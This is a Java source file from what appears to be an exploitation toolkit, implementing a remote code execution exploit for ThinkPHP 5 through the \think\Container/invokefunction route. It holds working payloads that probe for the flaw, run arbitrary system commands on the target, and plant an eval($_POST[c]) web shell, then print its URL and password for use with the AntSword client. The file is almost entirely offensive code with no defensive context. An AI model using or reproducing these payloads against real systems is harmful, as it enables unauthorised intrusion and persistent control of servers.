package fun.fireline.exp.php.thinkphp;

import fun.fireline.core.ExploitInterface;
import fun.fireline.tools.HttpTools;
import fun.fireline.tools.Response;
import fun.fireline.tools.Tools;

import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Base64;
import java.util.HashMap;
import java.util.Iterator;

/**
 * @author yhy
 * @date 2021/8/20 22:23
 * @github https://github.com/yhy0
 */

public class TP5_invoke_func_code_exec_2 implements ExploitInterface {
    private String target = null;
    private boolean isVul = false;
    private HashMap<String, String> headers = new HashMap();
    private String results = null;


    // 检测漏洞是否存在
    @Override
    public String checkVul(String url) {
        this.target = url;

        String payload0 = "/index.php?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=var_dump&vars[1][]=((md5(2333))";
        url = url + payload0;

        Response response = HttpTools.get(url, this.headers, "UTF-8");
        if (response.getText().contains("56540676a129760a")) {
            this.results = "[+] 目标存在" + this.getClass().getSimpleName() + "漏洞";
            this.isVul = true;
            return this.results;
        } else if (response.getError() != null) {
            this.results = "[-] 检测漏洞" + this.getClass().getSimpleName() + "失败， " + response.getError();
            return this.results;
        } else {
            this.results = "[-] 目标不存在" + this.getClass().getSimpleName() + "漏洞";
            return this.results;
        }

    }

    // 命令执行
    @Override
    public String exeCmd(String cmd, String encoding) {
        String payload = "/index.php?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=((md5(2333))" + cmd;
        String  url = this.target + payload;
        Response response = HttpTools.get(url, this.headers, encoding);
        if (response.getError() == null) {
            this.results = Tools.regReplace(response.getText());
        } else {
            this.results = response.getError();
        }

        return this.results;
    }

    // 获取当前的web路径，todo
    @Override
    public String getWebPath() {
        String result = exeCmd("@print(realpath(__ROOT__))", "UTF-8");
        return result;
    }

    @Override
    public String uploadFile(String content, String fileName, String platform) throws Exception {
        String payload = "/index.php?s=admin/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=${@print(eval($_POST[c]))}";
        Response response = HttpTools.post(this.target + payload, "c=phpinfo();", this.headers, "UTF-8");
        if (response.getError() == null && response.getText().contains("PHP Version")) {
            this.results = "[+] 执行成功，请使用蚁剑连接即可, 密码为c ：" + this.target + payload;
        } else {
            this.results = "[-] 上传失败: " + response.getError();
        }

        return this.results;
    }

    @Override
    public boolean isVul() {
        return this.isVul;
    }
}
